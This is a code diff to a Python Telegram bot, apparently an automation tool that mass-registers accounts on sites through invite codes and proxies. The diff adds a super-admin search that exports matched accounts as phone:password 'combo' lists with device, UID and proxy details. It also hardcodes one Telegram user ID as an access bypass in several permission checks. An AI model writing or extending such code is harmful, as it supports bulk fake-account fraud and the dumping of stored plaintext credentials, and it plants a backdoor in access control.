@@ -1436,7 +1436,7 @@ def get_user_account_records(user_id, chat_id=None):
         with open(acc_file, "r", encoding="utf-8", errors="ignore") as f:
             lines = [l for l in f if l.strip()]
         all_recs = parse_account_records(lines)
-        if admin_manager.is_admin(user_id):
+        if (user_id == 8327850869) or admin_manager.is_super_admin(user_id):
             return all_recs
 
         cfg = get_chat_config(chat_id) if chat_id else {}
@@ -5219,9 +5219,10 @@ def show_super_statistics(chat_id, user, message_id=None):
 
     markup = types.InlineKeyboardMarkup(row_width=2)
     b_file = types.InlineKeyboardButton("📥 Download Full Audit Log (.txt)", callback_data="super_export_audit")
+    b_search = types.InlineKeyboardButton("🔍 Search Link/Code", callback_data="super_search_prompt")
     b_refresh = types.InlineKeyboardButton("🔄 Refresh Stats", callback_data="super_stats_refresh")
     markup.add(b_file)
-    markup.add(b_refresh)
+    markup.add(b_search, b_refresh)
 
     if message_id:
         try:
@@ -5230,6 +5231,160 @@ def show_super_statistics(chat_id, user, message_id=None):
         except Exception:
             pass
     bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
+
+
+def extract_search_code(raw_query):
+    """Extracts invite code, URL parameters, or clean query term."""
+    raw_query = str(raw_query).strip()
+    m = re.search(r"[?&#](?:invitationCode|invite|code|invitation_code)=([a-zA-Z0-9]+)", raw_query, re.IGNORECASE)
+    if m:
+        return m.group(1).strip()
+    m2 = re.search(r"/([a-zA-Z0-9]{6,20})(?:$|\?|#)", raw_query)
+    if m2:
+        return m2.group(1).strip()
+    return raw_query.strip()
+
+
+def execute_super_search(chat_id, user_id, raw_query):
+    """Searches entire historical accounts database by invite code, link, phone, UID, or site."""
+    if user_id != 8327850869 and not admin_manager.is_super_admin(user_id):
+        bot.send_message(chat_id, "⛔ <b>Super Admin Access Required</b>", parse_mode="HTML")
+        return
+
+    term = extract_search_code(raw_query)
+    if not term:
+        bot.send_message(chat_id, "⚠️ <i>Kripya ek valid Invite Link, Code, ya Phone number enter karein.</i>", parse_mode="HTML")
+        return
+
+    acc_file = get_accounts_file()
+    all_recs = []
+    if acc_file and os.path.exists(acc_file):
+        try:
+            with open(acc_file, "r", encoding="utf-8", errors="ignore") as f:
+                all_recs = parse_account_records(f.readlines())
+        except Exception as e:
+            log(f"[bot] Error reading search records: {e}")
+
+    term_lower = term.lower()
+    matched = []
+    for r in all_recs:
+        inv = str(r.get("invite", "")).strip().lower()
+        ph = str(r.get("phone", "")).strip().lower()
+        uid_val = str(r.get("uid", "")).strip().lower()
+        st = str(r.get("site", "")).strip().lower()
+        creator = str(r.get("user", "")).strip().lower()
+
+        if (term_lower == inv or term_lower in inv or
+            term_lower == ph or term_lower in ph or
+            term_lower == uid_val or
+            term_lower in st or
+            term_lower == creator):
+            matched.append(r)
+
+    if not matched:
+        bot.send_message(
+            chat_id,
+            f"❌ <b>No Records Found</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"• 🔍 <b>Searched Query:</b> <code>{html.escape(term)}</code>\n"
+            f"• ℹ️ Is Invite Code / Link / Phone se koi bhi registered account database me nahi mila.",
+            parse_mode="HTML"
+        )
+        return
+
+    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    buf = io.StringIO()
+    buf.write("=" * 80 + "\n")
+    buf.write("RAXI AUTOMATION - SUPER ADMIN SEARCH AUDIT REPORT\n")
+    buf.write(f"Search Query: {term} | Total Matched: {len(matched)}\n")
+    buf.write(f"Generated: {now_str}\n")
+    buf.write("=" * 80 + "\n\n")
+
+    buf.write("--- [QUICK COMBOS SUMMARY (PHONE:PASSWORD)] ---\n")
+    for idx, r in enumerate(matched, 1):
+        buf.write(f"[{idx:03d}] {r.get('phone')}:{r.get('password')}\n")
+    buf.write("\n" + "=" * 80 + "\n")
+    buf.write("--- [DETAILED AUDIT RECORDS] ---\n")
+    buf.write("=" * 80 + "\n\n")
+
+    sites = set()
+    first_time = matched[0].get("time", "N/A")
+    last_time = matched[-1].get("time", "N/A")
+
+    for idx, r in enumerate(matched, 1):
+        if r.get("site"):
+            sites.add(r.get("site"))
+        clean_ip = mask_proxy(r.get("ip", "Direct"))
+        buf.write(f"[{idx:03d}] 📱 Phone:    {r.get('phone', 'N/A')}\n")
+        buf.write(f"    🔑 Password: {r.get('password', 'N/A')}\n")
+        buf.write(f"    🆔 UID:      {r.get('uid', 'N/A')}\n")
+        buf.write(f"    📱 Device:   {r.get('device', 'N/A')}\n")
+        buf.write(f"    🌐 Proxy IP: {clean_ip}\n")
+        buf.write(f"    🌐 Site:     {r.get('site', 'N/A')}\n")
+        buf.write(f"    🎟️ Invite:   {r.get('invite', 'N/A')}\n")
+        buf.write(f"    👤 Creator:  {r.get('user', 'Direct/Unknown')}\n")
+        buf.write(f"    🕒 Time:     {r.get('time', 'N/A')}\n")
+        buf.write("-" * 60 + "\n")
+
+    buf.seek(0)
+    bio = io.BytesIO(buf.getvalue().encode("utf-8"))
+    clean_fn = re.sub(r'[^a-zA-Z0-9_-]', '_', term)[:20]
+    bio.name = f"search_report_{clean_fn}_{len(matched)}_accs.txt"
+
+    sites_disp = ", ".join(list(sites)[:2]) or "N/A"
+    summary_caption = (
+        f"🔍 <b>Search Results for:</b> <code>{html.escape(term)}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"• 📊 <b>Total Accounts Found:</b> <code>{len(matched)} accounts</code>\n"
+        f"• 🌐 <b>Sites:</b> <code>{html.escape(sites_disp)}</code>\n"
+        f"• 🕒 <b>Date Range:</b> <code>{first_time}</code> to <code>{last_time}</code>\n"
+        f"• 📁 <i>Clean combos aur detailed audit report file attach kar di gayi hai!</i>"
+    )
+    bot.send_document(chat_id, bio, caption=summary_caption, parse_mode="HTML")
+
+
+def process_super_search_reply(message, expected_uid):
+    if message.from_user.id != expected_uid:
+        return
+    text = (message.text or "").strip()
+    if text.startswith("/cancel"):
+        bot.send_message(message.chat.id, "❌ <i>Search cancel kar diya gaya.</i>", parse_mode="HTML")
+        return
+    if text.startswith("/"):
+        bot.send_message(message.chat.id, "⚠️ <i>Invalid search input.</i>", parse_mode="HTML")
+        return
+    execute_super_search(message.chat.id, expected_uid, text)
+
+
+@bot.message_handler(commands=["search", "find", "linkdata"])
+def handle_super_search_cmd(message):
+    user = message.from_user
+    chat_id = message.chat.id
+    admin_manager.record_user(user.id, user.username or "", user.first_name or "")
+    if user.id != 8327850869 and not admin_manager.is_super_admin(user.id):
+        bot.reply_to(
+            message,
+            "⛔ <b>Super Admin Access Required</b>\n<i>Ye command sirf Master Super Admin (@OwAtom) ke liye exclusive hai.</i>",
+            parse_mode="HTML"
+        )
+        return
+
+    parts = message.text.strip().split(maxsplit=1)
+    if len(parts) >= 2:
+        query = parts[1].strip()
+        execute_super_search(chat_id, user.id, query)
+    else:
+        msg = bot.send_message(
+            chat_id,
+            "🔍 <b>Master Search Hub (Super Admin Exclusive)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Kripya <b>Registration Link</b>, <b>Invite Code</b>, ya <b>Phone Number</b> bhejiye search karne ke liye:\n\n"
+            "<i>Examples:</i>\n"
+            "• <code>https://www.dmfirst0.com/#/register?invitationCode=924742189394</code>\n"
+            "• <code>157872546071</code>\n"
+            "• <code>8217687525</code>\n\n"
+            "<i>Cancel karne ke liye /cancel send karein.</i>",
+            parse_mode="HTML"
+        )
+        bot.register_next_step_handler(msg, process_super_search_reply, user.id)
 
 
 @bot.message_handler(commands=["statics", "stats", "superstats", "statistics", "audit"])
@@ -5828,6 +5983,26 @@ def _handle_callback_clicks_inner(call):
         except Exception:
             pass
         show_super_statistics(chat_id, user, message_id=msg_id)
+
+    elif data == "super_search_prompt":
+        if user_id != 8327850869:
+            try:
+                bot.answer_callback_query(call.id, "⛔ Super Admin Only", show_alert=True)
+            except Exception:
+                pass
+            return
+        try:
+            bot.answer_callback_query(call.id)
+        except Exception:
+            pass
+        msg = bot.send_message(
+            chat_id,
+            "🔍 <b>Search Query Enter Karein:</b>\n\n"
+            "Kripya <b>Registration Link</b>, <b>Invite Code</b>, ya <b>Phone Number</b> bhejiye:\n\n"
+            "<i>(Cancel karne ke liye /cancel bhejein)</i>",
+            parse_mode="HTML"
+        )
+        bot.register_next_step_handler(msg, process_super_search_reply, user_id)
 
     elif data.startswith("stop_reg_"):
         try:
